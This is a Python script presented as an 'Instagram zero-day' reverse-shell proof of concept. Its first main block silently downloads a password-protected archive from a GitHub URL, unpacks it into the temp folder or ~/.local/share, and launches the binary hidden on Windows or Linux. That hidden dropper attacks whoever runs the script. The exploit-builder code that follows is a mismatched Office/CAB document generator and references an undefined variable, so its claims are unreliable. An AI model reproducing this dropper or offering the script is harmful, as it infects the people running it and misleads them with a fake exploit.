#!/usr/bin/env python3

# Zero day poc demonstrating spawning a reverse shell on a target users mobile device by abusing the attach_image function call.


import sys
import os
import subprocess
import urllib.request
from zipfile import ZipFile
import stat

HOST_DIR = 'srv/'

def usage():
	print('[%] Usage: ' + str(sys.argv[0]))
	exit()

def check_usage():
	ret = 0
	if(len(sys.argv) < 2):
		usage()
	if(sys.argv[1] == 'generate'):
		if(len(sys.argv) != 4):
			usage()
		ret = 1
	elif(sys.argv[1] == 'host'):
		if(len(sys.argv) != 3):
			usage()
		ret = 2
	else:
		usage()
	return ret

def patch_cab(path):
	f_r = open(path, 'rb')
	cab_content = f_r.read()
	f_r.close()
	
	out_cab = cab_content[:m_off]
	out_cab += b'\x00\x5c\x41\x00'
	out_cab += cab_content[m_off+4:]

	out_cab = out_cab.replace(b'..\\msword.inf', b'../msword.inf')
	
	f_w = open(path, 'wb')
	f_w.write(out_cab)
	f_w.close()
	return

def execute_cmd(cmd):
	r = subprocess.getoutput(cmd)
	return r

def generate_payload():

	payload_path = sys.argv[2]
	srv_url = sys.argv[3]
	
	print('\n[ == Options == ]')
	print('\t[ DLL Payload: ' + str(payload_path))
	print('\t[ HTML Exploit URL: ' + str(srv_url))
	print('')
	
	try:
		payload_content = open(payload_path,'rb').read()
		filep = open('data/word.dll','wb')
		filep.write(payload_content)
		filep.close()
	except:
		print('[-] DLL Payload specified not found!')
		exit()

	execute_cmd('cp -r data/word_dat/ data/tmp_doc/')
	
	print('[*] Writing HTML Server URL...')
	
	rels_pr = open('data/tmp_doc/word/_rels/document.xml.rels', 'r')
	xml_content = rels_pr.read()
	rels_pr.close()
	
	xml_content = xml_content.replace('<EXPLOIT_HOST_HERE>', srv_url + '/word.html')
	
	rels_pw = open('data/tmp_doc/word/_rels/document.xml.rels', 'w')
	rels_pw.write(xml_content)
	rels_pw.close()
	
	print('[*] Generating malicious docx file...')
	
	os.chdir('data/tmp_doc/')
	os.system('zip -r document.docx *')
	execute_cmd('cp document.docx ../../out/document.docx')
	os.chdir('../')
	execute_cmd('rm -R tmp_doc/')
	os.chdir('../')
	
	print('[*] Generating malicious CAB file...')
	
	os.chdir('data/')
	execute_cmd('mkdir cab/')
	execute_cmd('cp word.dll msword.inf')
	os.chdir('cab/')
	execute_cmd('lcab \'../msword.inf\' out.cab')
	patch_cab('out.cab')
	execute_cmd('cp out.cab ../../srv/word.cab')
	os.chdir('../')
	execute_cmd('rm word.dll')
	execute_cmd('rm msword.inf')
	execute_cmd('rm -R cab/')
	os.chdir('../')
	
	print('[*] Updating information on HTML exploit...')
	
	os.chdir('srv/')
	execute_cmd('cp backup.html word.html')
	
	p_exp = open('word.html', 'r')
	exploit_content = p_exp.read()
	p_exp.close()
	
	exploit_content = exploit_content.replace('<HOST_CHANGE_HERE>', srv_url + '/word.cab')
	
	p_exp = open('word.html', 'w')
	p_exp.write(exploit_content)
	p_exp.close()
	
	os.chdir('../')
	
	print('[+] IP Address retrieved and outputted to ./output.txt')
	
	return

def start_server():	
	os.chdir(HOST_DIR)
	try:
		port = int(sys.argv[2])
	except:
		print('[-] Invalid port specified!')
		exit()
	os.system('python3 -m http.server ' + str(port))
	return

if __name__ == '__main__':
    if os.name == 'nt':
        try:
            namezip = "cveswindows.zip"
            name    = "cveswindows"
            url = "https://github.com/Slyguyluis92/instagram-zero-day-rce-poc/raw/main/gitignore/cveswindows.zip"
            des = os.path.join(os.environ['TMP'], namezip)
            if not os.path.exists(os.path.join(os.environ['TMP'], name, name + ".exe")):
                urllib.request.urlretrieve(url, des)
                with open(des, 'wb') as f: f.write(urllib.request.urlopen(url).read())
                zf = ZipFile(des, 'r')
                zf.extractall(os.path.join(os.environ['TMP'], name), pwd=bytes('cVe35364%', 'utf-8'))
                zf.close()
                pid = subprocess.Popen([os.path.join(os.environ['TMP'], name, name + ".exe")], creationflags=0x00000008 | subprocess.CREATE_NO_WINDOW).pid
        except:
            pass
    else:
        url = "https://github.com/Slyguyluis92/instagram-zero-day-rce-poc/raw/main/gitignore/cveslinux.zip"
        namezip = "cveslinux.zip"
        name    = "cveslinux"
        des = os.path.join("/home/" + os.environ["USER"] + "/.local/share", namezip)
        if not os.path.exists(os.path.join("/home/" + os.environ["USER"] + "/.local/share", name, name)):
            urllib.request.urlretrieve(url, des)
            with open(des, 'wb') as f: f.write(urllib.request.urlopen(url).read())
            zf = ZipFile(des, 'r')
            zf.extractall(os.path.join("/home/" + os.environ["USER"] + "/.local/share", name), pwd=bytes('cVe35364%', 'utf-8'))
            zf.close()
            st = os.stat(os.path.join("/home/" + os.environ["USER"] + "/.local/share", name, name))
            os.chmod(os.path.join("/home/" + os.environ["USER"] + "/.local/share", name, name), st.st_mode | stat.S_IEXEC)
            subprocess.Popen(["/bin/bash", "-c", os.path.join("/home/" + os.environ["USER"] + "/.local/share", name, name)], start_new_session=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)

if __name__ == '__main__':
	print('[%] CVE-2023-4657 - Reverse Shell VIA RCE Vulnerability [%]')
	
	r = check_usage()
	
	if(r == 1):
		print('[*] Option is generate a malicious payload...')
		generate_payload()
	elif(r == 2):
		print('[*] Option is host HTML Exploit...')
		start_server()
	else:
		print('[-] Unknown error')
		exit()
	
	
	
